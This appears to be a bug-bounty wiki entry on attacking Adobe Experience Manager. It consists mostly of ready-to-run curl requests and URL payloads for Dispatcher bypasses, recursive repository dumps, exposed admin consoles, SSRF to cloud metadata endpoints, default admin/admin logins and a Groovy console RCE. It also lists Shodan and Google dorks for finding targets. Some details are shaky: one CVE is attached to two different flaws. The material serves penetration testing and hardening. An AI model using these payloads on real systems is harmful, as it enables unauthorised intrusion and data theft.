---
title: "AEM (Adobe Experience Manager) Hacking and Misconfigurations"
type: technique
tags: [web, aem, cms, adobe, misconfiguration, information-disclosure, ssrf, rce, bug-bounty]
date_created: 2026-08-17
date_updated: 2026-08-17
sources: []
related: ["[[ssrf]]", "[[command-injection]]", "[[information-disclosure]]"]
status: active
---

# AEM (Adobe Experience Manager) Hacking and Misconfigurations

## Overview

Adobe Experience Manager (AEM) is an enterprise CMS used by Fortune 500 companies. It stores content in a hierarchical Java Content Repository (JCR). Misconfigurations in the Dispatcher (the cache/filter layer) expose the entire internal structure via JSON endpoints, and misconfigured servlets expose SSRF and RCE surfaces.

## How AEM works (security context)

```
Internet -> [AEM Dispatcher] -> [AEM Application]
              ^
         Allowlist of extensions/selectors
         If misconfigured -> full bypass
```

Detection notes: default header `X-Frame-Options: SAMEORIGIN`; typical paths `/content/dam/`, `/etc/designs/`, `/libs/`.

**Critical selectors and extensions**:
- `.infinity.json` -> recursive dump of the ENTIRE node and children
- `.1.json` -> first-level dump
- `.tidy.json` -> formatted dump
- `.childrenlist.json` -> children list
- `.ext.infinity.json` -> alternate bypass

## Reconnaissance

### 1. Identify AEM

```bash
# Nuclei
nuclei -u https://target.com -t technologies/tech-detect.yaml -tags aem

# Characteristic AEM paths
curl -s https://target.com/libs/granite/core/content/login.html
curl -s https://target.com/crx/de/index.jsp        # CRXDE Lite (dev tool)
curl -s https://target.com/system/console           # Felix OSGi Console
curl -s https://target.com/content/dam.json         # DAM (Digital Asset Manager)

# Version check
/system/console/bundles
/crx/de/index.jsp   # CRX Explorer (NEVER expose in production)
/crx/packmgr/       # Package Manager

# Exposed servlets
/bin/querybuilder.json   # QueryBuilder
/bin/wcmcommand          # WCM commands
```

### 2. AEM Hacker tool

```bash
# Automated AEM tool
python3 aem_hacker.py --url https://example.com --host localhost
```

GitHub: https://github.com/0ang3el/aem-hacker

### 3. Fuzzing AEM paths

```bash
# With an AEM-specific wordlist
ffuf -w nuclei-templates/fuzzing/service/aem.txt -u https://target.com/FUZZ -mc 200,302
```

## Common vulnerabilities

### 1. AEM Dispatcher bypass, access to internal data

```bash
# Full dump of the Digital Asset Manager (127MB in a real case)
curl -sI "https://target.com/content/dam/brand-path/.ext.infinity.json"

# Dispatcher bypass variations
https://target.com/content/dam/.infinity.json
https://target.com/content/dam/.1.json
https://target.com/content/dam/.childrenlist.json

# Dispatcher bypasses
/content.infinity.json%3Balloworigin%3A%3E.json
/content/.infinity.json/a.css
/content/.infinity.json;%0d%0a.css
```

### 2. Dispatcher bypass patterns

```
# Suffix bypass
/content/path.html/suffix.json
/content/path.1.json/suffix.css

# Extension bypass
/content/path..json
/content/path.json%0d%0a
/content/path.1.json.html
/content/path.infinity.json.html

# Selector injection
/content/path.ext.html
/content/path.ext.css
```

### 3. CRXDE Lite exposed (CVE-2018-12809)

```bash
# Direct repository access
curl https://target.com/crx/de/index.jsp

# Allows reading any file in the repository
curl https://target.com/crx/de/index.jsp#/apps/target/config/
```

### 4. Felix OSGi Console exposed

```bash
# Administrative console
curl https://target.com/system/console/configMgr

# Critical endpoints
/system/console/bundles     # installed bundles
/system/console/config      # configurations
/system/console/users       # users
```

### 5. QueryBuilder exposed (SSRF / Information Disclosure)

```bash
# AEM QueryBuilder allows searching the JCR
curl "https://target.com/bin/querybuilder.json?type=dam:Asset&path=/content/dam&limit=100"

# QueryBuilder executes queries in the JCR repository
curl "https://target.com/bin/querybuilder.json?type=nt:file&path=/&p.limit=-1"
# Returns every file in the repository

# SSRF via querybuilder
curl "https://target.com/bin/querybuilder.json?type=nt:base&nodename=*.json"

# May expose file metadata and internal paths
```

### 6. ReportingServicesProxyServlet (SSRF, CVE-2018-12809)

```bash
# SSRF via the proxy servlet, e.g. reach cloud metadata
curl "https://target.com/libs/cq/contentinsight/proxy/statisticsservlet?endpoint=http://169.254.169.254/latest/meta-data/"

# Alternate proxy servlet path
curl "https://target.com/etc/reports/reportingservicesproxyservlet?origin=http://internal.service/"
```

### 7. Open endpoints

```bash
# List users (no auth on bad configs)
/bin/listchildren?path=/home/users

# ContentFinder (search content)
/bin/s7dam/contentfinder?type=assets&query=password

# Geo IP (may leak info)
/libs/foundation/components/location/clientlibs/location.js

# Debug page
/crx/explorer/browseasset.jsp

# OpenSocial proxy (SSRF)
/libs/opensocial/proxy?url=http://internal/
```

### 8. Default credentials

```
CRX Package Manager: admin/admin
OSGi Console: admin/admin
```

### 9. RCE via Groovy Script Console

```bash
# If /system/console/bundles is reachable with admin/admin
# Groovy console -> execute("id".execute().text)
curl -u admin:admin "https://target.com/system/console/bundles"
```

### 10. SSRF via ProxyServlet

```bash
curl "https://target.com/etc/clientcontext/default/contextstores.infinity.json"
```

## Endpoint list to test

```
/bin/querybuilder.json
/crx/de/index.jsp
/crx/packmgr/
/system/console/
/system/console/bundles
/etc/reports/reportingservicesproxyservlet
/libs/opensocial/proxy
/content/../libs/
/content/usergenerated/../libs/
/etc/ClientContext/default/contextstores.infinity.json
/content.feed.xml
/content.infinity.json  (AEM "Sling bomb")
/.json -> returns JSON for any resource
/home/users.1.json
```

## Sling URL decomposition (bypass)

```
# AEM uses Sling URL decomposition:
/content/data.json -> resource=content/data, extension=json
# Auth bypass:
/content/usergenerated/../libs/sling/servlet/default/GET.servlet
```

## Shodan queries for AEM

```bash
http.component:"Adobe Experience Manager"
http.component:"Adobe Experience Manager" org:"Amazon"
http.title:"Adobe Experience Manager"
```

## Google dorking for AEM

```bash
site:target.* inurl:'/content/dam' ext:txt
site:*.*  inurl:'/content/dam' ext:pdf
inurl:/content/geometrixx/
inurl:/etc.clientlibs
inurl:/libs/cq/security/userinfo.json
```

## Exfiltration via .children.json

```
Original URL: https://www.example.com/content/dam/example.pdf
Modify:       https://www.example.com/content/dam/example.pdf/.children.json

Response: jcr:lastModifiedBy, jcr:lastReplicatedBy -> internal email, username
```

**Enumerate all files:**

```
https://target.com/content/dam/.children.400.json  -> lists up to 400 items in /content/dam
```

## Real-world impact (real case)

- **Target**: luxury brand (Fortune 500)
- **Method**: `curl -sI "https://target.com/content/dam/brand-path/.ext.infinity.json"`
- **Result**: 127MB of internal repository data (no authentication)
- **Exposed data**: full DAM structure, metadata of every asset, software versions

## Tools

| Tool | Use |
|-----------|-----|
| `aem_hacker.py` | Automated AEM vulnerability scan (`python aem_hacker.py -u https://target.com --host target.com`) |
| `nuclei` with AEM tags | Automated detection and exploitation |
| `ffuf` with an AEM wordlist | Path bruteforce |
| `curl` | Manual endpoint verification |
| HTTP proxy | Manual testing |

Path list reference: https://github.com/clarkvoss/AEM-List/blob/main/paths

## References

- https://github.com/0ang3el/aem-hacker
